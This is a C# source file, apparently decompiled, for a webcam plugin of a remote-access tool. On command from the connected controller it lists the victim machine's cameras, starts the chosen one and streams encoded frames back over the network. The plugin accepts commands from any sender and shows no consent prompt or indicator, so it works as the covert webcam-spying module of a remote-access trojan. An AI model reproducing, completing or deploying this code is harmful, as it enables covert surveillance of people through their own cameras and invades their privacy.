

using AForge.Video;
using AForge.Video.DirectShow;
using InvokedCommon.MessageHandlers;
using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedCommon.Video;
using InvokedCommon.Video.Codecs;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;


namespace Plugin.MessageHandlers
{
	public class PluginWebcamHandler : NotificationMessageProcessor, IMessageProcessor
	{
		private static UnsafeStreamCodec _streamCodec;
		private static readonly object _streamcodecLock = new object();
		private static bool WebcamStarted;
		private static bool NeedsCapture;
		private static Client Client;
		private static int WebcamVar;
		private static int ResolutionVar;
		private static int QuailtyVar;
		private static VideoCaptureDevice FinalVideo;

		public override bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case GetWebcams _:
				case DoWebcamStop _:
					return true;
				default:
					return message is GetWebcamImage;
			}
		}

		public override bool CanExecuteFrom(ISender sender) => true;

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetWebcams message1:
					this.Execute(sender, message1);
					break;
				case DoWebcamStop message2:
					this.Execute(sender, message2);
					break;
				case GetWebcamImage message3:
					this.Execute(sender, message3);
					break;
			}
		}

		private void Execute(ISender client, GetWebcams message)
		{
			List<string> stringList = new List<string>();
			List<Size> sizeList = new List<Size>();
			foreach (FilterInfo filterInfo in (CollectionBase) new FilterInfoCollection(FilterCategory.VideoInputDevice))
			{
				stringList.Add(filterInfo.Name);
				foreach (VideoCapabilities videoCapability in new VideoCaptureDevice(filterInfo.MonikerString).VideoCapabilities)
					sizeList.Add(videoCapability.FrameSize);
			}
			if (stringList.Count <= 0)
				return;
			client.Send<GetWebcamsResponse>(new GetWebcamsResponse()
			{
				Number = stringList.Count,
				Webcams = stringList
			});
		}

		private void Execute(ISender client, GetWebcamImage message)
		{
			if (PluginWebcamHandler.WebcamStarted)
				return;
			PluginWebcamHandler.NeedsCapture = true;
			PluginWebcamHandler.WebcamVar = message.Webcam;
			PluginWebcamHandler.ResolutionVar = message.Resolution;
			PluginWebcamHandler.QuailtyVar = message.Quality;
			PluginWebcamHandler.Client = (Client) client;
			PluginWebcamHandler.WebcamStarted = true;
			PluginWebcamHandler.FinalVideo = new VideoCaptureDevice(new FilterInfoCollection(FilterCategory.VideoInputDevice)[message.Webcam].MonikerString);
			Resolution resolution = new Resolution()
			{
				Height = 0,
				Width = 0
			};
			lock (PluginWebcamHandler._streamcodecLock)
			{
				PluginWebcamHandler._streamCodec?.Dispose();
				PluginWebcamHandler._streamCodec = new UnsafeStreamCodec(PluginWebcamHandler.QuailtyVar, PluginWebcamHandler.WebcamVar, resolution);
			}
			PluginWebcamHandler.FinalVideo.NewFrame += new NewFrameEventHandler(PluginWebcamHandler.FinalVideo_NewFrame);
			PluginWebcamHandler.FinalVideo.Start();
		}

		private static void StopWebcam()
		{
			if (PluginWebcamHandler.FinalVideo != null && PluginWebcamHandler.FinalVideo.IsRunning)
			{
				PluginWebcamHandler.NeedsCapture = false;
				PluginWebcamHandler.WebcamStarted = false;
				PluginWebcamHandler.FinalVideo.SignalToStop();
				PluginWebcamHandler.FinalVideo.WaitForStop();
				PluginWebcamHandler.FinalVideo.NewFrame -= new NewFrameEventHandler(PluginWebcamHandler.FinalVideo_NewFrame);
				PluginWebcamHandler.FinalVideo = (VideoCaptureDevice) null;
			}
			lock (PluginWebcamHandler._streamcodecLock)
			{
				PluginWebcamHandler._streamCodec?.Dispose();
				PluginWebcamHandler._streamCodec = (UnsafeStreamCodec) null;
			}
			GC.Collect();
			GC.WaitForPendingFinalizers();
		}

		private void Execute(ISender client, DoWebcamStop message) => PluginWebcamHandler.StopWebcam();

		private static void FinalVideo_NewFrame(object sender, NewFrameEventArgs e)
		{
			if (PluginWebcamHandler.Client == null || !PluginWebcamHandler.Client.Connected)
			{
				PluginWebcamHandler.StopWebcam();
			}
			else
			{
				if (!PluginWebcamHandler.WebcamStarted || !PluginWebcamHandler.NeedsCapture)
					return;
				Bitmap bitmap = (Bitmap) null;
				BitmapData bitmapdata = (BitmapData) null;
				try
				{
					bitmap = (Bitmap) e.Frame.Clone();
					bitmapdata = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
					using (MemoryStream outStream = new MemoryStream())
					{
						lock (PluginWebcamHandler._streamcodecLock)
						{
							if (PluginWebcamHandler._streamCodec == null)
								throw new Exception("StreamCodec can not be null.");
							PluginWebcamHandler._streamCodec.CodeImage(bitmapdata.Scan0, new Rectangle(0, 0, bitmap.Width, bitmap.Height), new Size(bitmap.Width, bitmap.Height), bitmap.PixelFormat, (Stream) outStream);
							PluginWebcamHandler.Client.Send<GetWebcamImageResponse>(new GetWebcamImageResponse()
							{
								Image = outStream.ToArray(),
								Quality = PluginWebcamHandler._streamCodec.ImageQuality,
								Webcam = PluginWebcamHandler._streamCodec.Monitor,
								Resolution = PluginWebcamHandler._streamCodec.Resolution
							});
						}
					}
				}
				catch (Exception ex)
				{
					lock (PluginWebcamHandler._streamcodecLock)
					{
						PluginWebcamHandler._streamCodec?.Dispose();
						PluginWebcamHandler._streamCodec = (UnsafeStreamCodec) null;
					}
				}
				finally
				{
					if (bitmap != null)
					{
						if (bitmapdata != null)
						{
							try
							{
								bitmap.UnlockBits(bitmapdata);
							}
							catch
							{
							}
						}
						bitmap.Dispose();
					}
				}
			}
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object) this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			PluginWebcamHandler._streamCodec?.Dispose();
			GC.Collect();
		}
	}
}
